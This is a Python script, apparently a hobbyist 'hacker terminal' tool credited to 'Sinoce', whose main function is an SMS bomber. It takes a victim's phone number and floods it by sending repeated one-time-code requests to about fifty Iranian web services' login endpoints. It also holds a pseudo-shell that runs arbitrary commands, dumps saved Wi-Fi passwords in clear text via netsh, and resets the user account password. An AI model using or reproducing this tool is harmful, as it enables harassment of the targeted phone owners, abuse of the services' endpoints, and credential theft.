from requests import post, get
from pyautogui import hotkey as key
from pyautogui import typewrite as tp
from pyautogui import screenshot as shot
from os import system as s
from time import sleep as sp
from subprocess import getoutput as out
from subprocess import check_output as check
from random import choice as ch
from random import randint as ir
from pyfiglet import figlet_format as pr
from colorama import Fore as c
import os


gr = c.GREEN
rd = c.RED
bl = c.BLUE
cy = c.CYAN
mg = c.MAGENTA
yl = c.YELLOW

lgr = c.LIGHTGREEN_EX
lrd = c.LIGHTRED_EX
lbl = c.LIGHTBLUE_EX
lcy = c.LIGHTCYAN_EX
lmg = c.LIGHTMAGENTA_EX
lyl = c.LIGHTYELLOW_EX
black = c.BLACK


matn_banners = ['Terminal Sinoce','S i n o c e','T e r m u x','Hsc','Security','Privte','IRAN','P Y T H O N','MR Sinoce','Stanford','GUN','exploit']
fonts = ['Avatar','Epic','slant','Big','doom','Standard','Banner3','Colossal','Double','Ivrit']

colorsl = [black,lyl,lmg,lcy,lbl,lrd,lgr]
colors = [gr,rd,bl,cy,mg,yl]
type_color = ['1',"2"]



file_com = open('Commands.txt','w')
user = out('echo %Username%')
plat = out('echo %Os%')
ilist = []

rand = ir(000000,999999)

if rand in ilist:
    rand = ir(000000,999999)
else:
    ilist.append(str(rand))
    password = 'Sinoce'

font = ch(fonts)
matn = ch(matn_banners)
# banner = pr(matn,font)
print(font)
print(lgr+pr('Termux'),'epic')
print('\n')
print(f'#$#{lyl}!!{rand}!!{lrd}Sinoce{lyl}..@..{lrd}Sinoce{lyl}..@..{lrd}Sinoce{lyl}..@..{lrd}Sinoce{lyl}..@..{lrd}Sinoce')
print(f'#$#{lrd}Sinoce{lyl}..@..{lrd}Sinoce{lyl}..@..{lrd}Sinoce{lyl}..@..{lrd}Sinoce{lyl}..@..{lrd}Sinoce{lyl}.@.')
print(f'#$#{lyl}..@..{lrd}Sinoce{lyl}..@..{lrd}Sinoce{lyl}..@..{lrd}Sinoce{lyl}..@..{lrd}Sinoce{lyl}..@..{lrd}Sinoce')
print(f'#$#{lrd}Sinoce{lyl}..@..{lrd}Sinoce{lyl}..@..{lrd}Sinoce{lyl}..@..{lrd}Sinoce{lyl}..@..{lrd}Sinoce{lyl}.@.')
print('\n')
print(f'{lgr}Welcome To {bl}Hsc {rd}*{lrd}*{yl}*{lyl}*')
print('\n')
def bomber():
    rd, gn, lgn, yw, lrd, be, pe = '\033[00;31m', '\033[00;32m', '\033[01;32m', '\033[01;33m', '\033[01;31m', '\033[00;34m', '\033[01;35m'
    cn = '\033[00;36m'
    os.system("clear")
    print (f"""



            {lrd}CR :{lgn} Sinoce68
            
            {lrd}Channel Rubika :{lgn} https://rubika.ir/Mr_Sinoce
            
            {lrd}Github :{lgn} github.com/Sinoce68
            
        {lrd}Communication with the manufacturer : {lgn}swgift.com@gmail.com
    {lrd}
    .d8888. .88b  d88. .d8888.   d8888b.  .d88b.  .88b  d88. d8888b. 
    88'  YP 88'YbdP`88 88'  YP   88  `8D .8P  Y8. 88'YbdP`88 88  `8D 
    `8bo.   88  88  88 `8bo.     88oooY' 88    88 88  88  88 88oooY' 
    `Y8b. 88  88  88   `Y8b.   88~~~b. 88    88 88  88  88 88~~~b. 
    db   8D 88  88  88 db   8D   88   8D `8b  d8' 88  88  88 88   8D 
    `8888Y' YP  YP  YP `8888Y'   Y8888P'  `Y88P'  YP  YP  YP Y8888P' 

     {yw}∧__∧
    (  ･ω･)
    (っ▄︻▇〓▄︻┻┳═一　{lrd}　sms sms sms sms{yw}
    /　   )ﾊﾞﾊﾞﾊﾞﾊﾞ

    ( /￣∪           
    """)
    phone = input(f"""{lrd}┌─<({cn}SMS{gn}@Sinoce68{lrd})-{yw}[~]{lrd}>
    └─< ({gn}Number{lrd}){pe}* {lrd}>──»  {cn}""")
    def start():
        try:
            num = int(input(f"{cn}ENTER NUMBER SMS 💥💥 {lrd}"))
        except:
            print ("NUMBER !")
        Api = [
                {"phone":phone},
                {"credential":{"phoneNumber":phone,"role":"PASSENGER"}},
                {"api_version":"3","method":"sendCode","data":{"phone_number":phone,"send_type":"SMS"}},
                {"cellphone":phone},
                "send=1&cellphone="+phone,
                "cellNumber="+phone,
                {"phoneNumber":phone},
                {"mobile":phone,"country_code":"IR","provider_code":"RUBIKA"},
                {"phone":phone},
                {"credential":{"phoneNumber":phone,"role":"PASSENGER"}},
                {"properties":{"language":2,"clientID":"8vp51nm2c3t4kagbefajo4cyj6z6slhv","deviceID":"8vp51nm2c3t4kagbefajo4cyj6z6slhv","clientVersion":"web"},"singleRequest":{"getOtpTokenRequest":{"username":phone}}},
                {"phone":phone},
                {"data":{"mobile":phone},"oneSignalPlayerId":"","appVersion":"2.0.0","deviceId":"01B30DE7-EC61-438A-BDB3-FC6910AE7E5E","deviceInfo":"x86_64","deviceToken":"","clientId":"com.espard.customer","platform":"web","osVersion":"10.2","timeZone":"GMT+3:30","time":"1630723653780"},
                {"cellphone":phone},
                {"mobile":phone},
                {"username":phone,"captchaHash":"","captchaValue":""},
                {"phone":phone},
                {"mobile":phone},
                {"username":phone},
                {"number":phone},
                {"phoneNumber":phone,"AuthenticationMode":1},
                {"mobile":phone},
                {"MobileNumber":phone,"type":""},
                {"phone":phone},
                {"phone":phone},
                {"cellNumber":phone,"device":{"deviceId":"f227ed1a-3ddf-4f42-bbea-606440e1ccb8","deviceModel":"WEB_BROWSER",        "deviceAPI":"WEB_BROWSER","osName":"WEB"}},
                {"mobile":phone},
                {"phone":phone,"headers":{"Content-Type":"application/x-www-form-urlencoded","Accept":"application/json"}},
                {"mobile":phone},
                { 'cellphone':phone},
                {"apiToken":"WTKnmBBIpjL8kcOo7YGD0qkaa6p06bVER9IMUNsyVOj9J2AMlmjESWhqtuNqWBNN","clientSecret":"aINO67nX5aCs5e7382XQJZkYbROBBewt","device":"web","username":phone},
                {"mobile":phone,"country_code":"+98"},
                {"UserName":phone},
                {"method":"phone","identifier":phone},
                {"username":phone},
                {"credential":{"phoneNumber":phone,"role":"PASSENGER"},"otpOption":"SMS"},
                {"cellphone":phone},
                {"Type":3,"Username":phone,"Password":None,"SourceChannel":"GF_L_40107_02","SourcePlatform":"OS","SourcePlatformAgentType":"Browser Name","SourcePlatformVersion":"Browser Version","FriendInviteCode":"FriendInviteCode","FreePackage":False,"GiftCode":None,"AppLog":{"DeviceName":"DeviceName","VersionName":"VersionName","VersionCode":0,"DeviceModel":"DeviceModel","OsVersion":"OsVersion","PhoneNo":phone,"Email":"Email"}},
                {"way":"mobile","identity":phone,"captchaPassToken":"9e928d74-4766-45dc-94ef-0ff4699b500f"},
                {"code":"98","phone":phone,"smsStatus":"default"},       
        ]
        for i in range(num):
            for j in range(num):
                for s in range(num):
                    try:
                        api = post ('https://api.divar.ir/v5/auth/authenticate', json=Api[0])
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api2 = post ('https://messengerg2c42.iranlms.ir/', json=Api[2])
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:    
                        api3 = post ('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', json=Api[3])
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api4 = post ('https://web.emtiyaz.app/json/login', json=Api[4])
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api5 = post ('https://bama.ir/signin-checkforcellnumber', json=Api[5])
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api6 = post ('https://ws.alibaba.ir/api/v3/account/mobile/otp', json=Api[6])
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api7 = post ('https://api.chartex.net/api/v2/user/validate', json=Api[7])
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")     
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")  
                    try:        
                        api8 = post ('https://www.digikala.com/ajax/users/login-with-otp/send-confirm-code/', json=Api[8])
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")   
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:       
                        api9 = post ('https://drdr.ir/api/registerEnrollment/verifyMobile', json=Api[9])
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")       
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try: 
                        api10 = post ('https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest', json=Api[10])
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")          
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api11 = post ('https://core.gapfilm.ir/api/v3.1/Account/Login', json=Api[11])
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")            
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api12 = post ('https://app.espard.com/api/v1/auth/identify-by-mobile', json=Api[12])
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")            
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api13 = post ('https://a4baz.com/api/web/login', json=Api[13])
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")           
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try: 
                        api14 = post ('https://taraazws.jabama.com/api/v4/account/send-code', json=Api[14])
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")        
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try: 
                        api15 = post ('https://www.tebinja.com/api/v1/users', json=Api[15])
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")           
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try: 
                        api16 = post ('https://api2.anten.ir/users', json=Api[16])
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")           
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api17 = post ('https://api.doctoreto.com/api/web/patient/v1/accounts/register', json=Api[17])
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")         
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api18 = post ('https://next.zarinpal.com/api/oauth/initialize', json=Api[18])
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")          
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api19 = post ('https://api.mobit.ir/api/web/v8/register/register', json=Api[19])
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")          
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api20 = post ('https://dayanshop.com/Auth/CheckPhoneNumber', json=Api[20])
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")       
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api21 = post ('https://api-react.okala.com/C/CustomerAccount/OTPRegister', json=Api[21])
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")      
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api22 = post ('https://restcore.bimeh.com/v1/authentication', json=Api[22])
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")       
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api23 = post ('https://diginext.ir/register/send-sms', json=Api[23])
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")        
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api24 = post ('https://api.digikalajet.ir/user/login-register/', json=Api[24])       
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")          
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api25 = post ('https://app.mydigipay.com/digipay/api/users/send-sms', json=Api[25])
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")          
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api26 = post ('https://app.itoll.ir/api/v1/auth/login', json=Api[26])
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")          
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api27 = post ('https://mobapi.banimode.com/api/v2/auth/request', json=Api[27])
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")           
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api28 = post ('https://tj8.ir/auth/register', json=Api[28])
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")           
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api29 = post ('https://mamifood.org/Registration.aspx/IsUserAvailable', json=Api[29])
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")           
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api30 = post ('https://restaurant.delino.com/user/register', json=Api[30])
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")            
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api31 = post ('https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile', json=Api[31])
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")        
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api32 = post ('https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request', json=Api[32])     
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")       
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api33 = post ('https://virgool.io/api/v1.4/auth/verify', json=Api[33])
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")           
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api34 = post ('https://www.sheypoor.com/api/v10.0.0/auth/send', json=Api[34])
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api35 = get (f'https://api.binjo.ir/api/panel/get_code/{phone}')
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")        
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api36 = get (f'https://core.gap.im/v1/user/add.json?mobile={phone}')
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")           
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api37 = get (f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{phone}')
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")   
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api38 = get (f'https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/{phone}/sms?cCode=')
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")       
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api39 = get (f'https://etma.ir/fa/Account/IsExistUserName?userName={phone}')
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")           
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api40 = get (f'https://api.digighate.com/user/code?phone={phone}')
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")          
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api41 = get (f'https://auth.mrbilit.com/api/login/exists/v2?mobileOrEmail={phone}&source=2&sendTokenIfNot=true')
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")          
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api42 = get (f'https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/{phone}/sms?cCode=+98')
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")           
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api43 = get (f'https://behandam.kermany.com/fitamin-central-service/api/fitamin/v2/register/status?mobile={phone}')
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")            
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api44 = get (f'https://filmnet.ir/api-v2/access-token/users/{phone}/otp')
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")         
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api45 = post ('https://api.tapsi.cab/api/v2.2/user', json=Api[35])
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")        
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api46 = post ('https://api.pinwork.co/api/v1/customer/verification', json=Api[36])
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")          
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api47 = post ('https://core.gapfilm.ir/api/v3.1/Account/Login', json=Api[37])
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")       
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
                    try:
                        api48 = post ('https://accounts.inoor.ir/api/v1.0/register/chooseway', json=Api[38])
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")     
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent") 
                    try:
                        api49 = post ('https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one', json=Api[39])
                        print (f"{rd}[{lgn}+{rd}]{gn} Sent")
                    except:
                        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    start()
def Sinoce():
    while 1:
        try:
            try:        
                matn = ch(matn_banners)
                font = ch(fonts)
                banner = pr(matn,font)
                ans = input(f'''({lrd}┌─<({cy}Sinoce{gr}@{lmg}({lcy}Root{lmg}){lrd}-{yl}[~]{lrd}>
 └─< ({gr}TerminalPrivte{lrd}){rd}* {lrd}>──»  {cy} ''')
                if ans.startswith('ban'):
                    if plat.startswith('Win'):
                        s('cls')
                    else:
                        s('clear')
                    sent = ch(type_color)
                    if sent == '1':
                        clr = ch(colors)
                    if sent == '2':
                        clr = ch(colorsl)
                    print(clr+banner)
                    print(font)
                if ans.startswith('cd '):
                    dr = ans.replace('cd ','')
                    try:
                        os.chdir(dr)
                    except PermissionError:
                        print(f"{lrd}Access is denied")
                    file_com.write(ans)
                else:
                    pass
                if ans == 'cd ..':
                    os.chdir('.')
                    file_com.write(ans)
                else:
                    pass
                if ans.startswith('set '):
                    file_com.write(ans)
                    r = str(ans.replace('set ','')).split('=')
                    var = r[0]
                    command = r[1]
                else:
                    pass
                if ans.startswith('%'):
                    file_com.write(ans)
                    se = str(ans.replace('%','')).split('%')
                    print(f"VAR = {var} COMMAND = {command}")
                else:
                    pass
                if ans.lower() == 'exit':
                    break
                if ans.lower() == 'pwd':
                    file_com.write(ans)
                    pwd = out('cd')
                    print(f'{lgr}YOUR LOCATION{lrd} >>{lbl} '+pwd)
                else:
                    pass
                if ans.lower() == 'screen':
                    file_com.write(ans)
                    shot('SRCEENSHOT.jpg')
                else:
                    pass
                if ans == ('uname'):
                    file_com.write(ans)
                    print(f'{bl}YOUR SYSTEM {rd}--{lrd}>> '+str(out('echo %Os%')))
                else:
                    pass
                if ans.lower() == 'clear' or ans == 'cls':
                    if plat.startswith('Win'):
                        clean = 'cls'
                        s(clean)
                    else:
                        clean = 'clear'
                        s(clean)
                if ans.startswith('netsh '):
                    s(ans)
                if ans == 'netsh':
                    s(ans)
                if ans == 'reload':
                    print(f'{lbl}Welcome {cy}From {lcy}New{lgr} Terminal {yl}*{lyl}*{rd}*{lrd}*')
                    Sinoce()
                if ans.startswith('wifi_sin '):
                    wifi = ans.replace('wifi_sin ','')
                    File_WF = open(f'Wifi_Pass{wifi}.txt','w')
                    profile_wifi = str(f'netsh wlan show profiles {wifi} key=clear | findstr Key')
                    Attack = out(str('profile_wifi'+f' > Wifi_Pass.txt'))
                    print(f'{lrd}PASSWORD {lgr}Wireless {lmg}{wifi}{lyl} -->>{lgr} Wifi_Pass_{wifi}.txt')
                if ans.startswith('passwd '):
                    pas = ans.replace('passwd ','')
                    pass_change = out(f'net user {user} {pas}')
                    print(f'{lcy}USERNAME {lbl}--{lgr}{user}{lbl}-- {lcy}PASSWORD{lrd} CHANGED{lbl} --{lgr}{pas}{lbl}-- ')
                if ans == 'Users':
                    users = out('net user').split('DefaultAccount')
                    print(users)
                if ans.lower() == 'ls':
                    ls = out('dir /w')
                    print(f'{lgr} {ls}')
                if ans == 'help':
                    print(f"""{lgr}cd{lbl} Change Directory \n{lgr}cd ..{lbl} Back Directory \n{lgr}ls{lbl} Volume Directory\n{lgr}dir{lbl} Volume Directory\n{lgr}clear{lbl} Clean Screen\n{lgr}cls{lbl} Clean Screen\n{lgr}uname{lbl} SYSTEM name\n{lgr}pwd{lbl} Lcation Directory \n{lgr}exit{lbl} EXIT THE HSC APP\n{lgr}set{lbl} Setup Variable \n Exmple:\n  Var1+Var2\n{lgr}banner{lbl} BANNER CHANGE""")
                else:
                    print(out(ans))                
            except EOFError:
                pass
        except KeyboardInterrupt:
            pass
    file_com.close()
